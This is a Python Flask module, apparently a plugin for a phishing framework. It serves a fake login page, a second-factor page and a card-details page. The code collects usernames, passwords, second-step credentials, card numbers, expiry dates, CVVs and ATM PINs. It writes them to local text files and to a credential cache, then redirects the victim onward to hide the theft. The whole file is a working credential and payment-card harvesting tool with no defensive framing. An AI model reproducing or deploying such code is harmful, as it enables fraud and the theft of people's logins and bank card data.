from __future__ import print_function
from flask import redirect, request, jsonify, Markup
from os import system
from core import functions
from core.base_module import *
import uuid
import mechanicalsoup
import bs4
import re, sys, time, random
import time
import json
import smtplib 

class ExampleModule(BaseModule):
    def __init__(self, enable_2fa=False):
        super().__init__(self)

        self.set_name('example')
        self.add_route('main', '/')
        self.add_route('twofactor', '/loginauth')
        self.add_route('credit', '/credit')
        self.add_route('redirect', '/redirect')
        self.enable_two_factor(enable_2fa)

    def main(self):
        self.user = request.values.get('username')
        self.password = request.values.get('password')
        next_url = '/loginauth'
        template = self.env.get_template('login.html')

        return template.render(
            next_url=next_url,
            hostname=request.host,
        )


    def twofactor(self):
        self.user = request.values.get('username')
        self.password = request.values.get('password')

        next_url = '/credit'

        functions.cache_creds(self.name, self.user, self.password)

        template = self.env.get_template('loginauth.html')

        f = open('login.txt', 'a')
        f.write(f'Username {self.user} and Password {self.password}')
        f.close()

        return template.render(
            hostname=request.host,
            next_url=next_url,
            username=self.user,
            password=self.password,
        )


    def credit(self):
        self.user = request.values.get('username')
        self.password = request.values.get('password')
        self.authusername = request.values.get('authusername')
        self.authpassword = request.values.get('authpassword')

        next_url = '/redirect'

        functions.cache_creds(self.name, self.authusername, self.authpassword)

        template = self.env.get_template('credit.html')

        f = open('loginauth.txt', 'a')
        f.write(f'Username {self.authusername} and Password {self.authpassword}')
        f.close()

        return template.render(
            hostname=request.host,
            next_url=next_url,
        )


    def redirect(self):
        self.ccnum = request.values.get('ccnum')
        self.expdate = request.values.get('expdate')
        self.cvv = request.values.get('cvv')
        self.ATM = request.values.get('ATM')

        f = open('debit.txt', 'a')
        f.write(f'Card Number {self.ccnum} - Expiry Date {self.expdate} - CVV {self.cvv} - ATM PIN {self.ATM}')
        f.close()
        return redirect(self.final_url, code=302)



def load(enable_2fa=False):
    return ExampleModule(enable_2fa)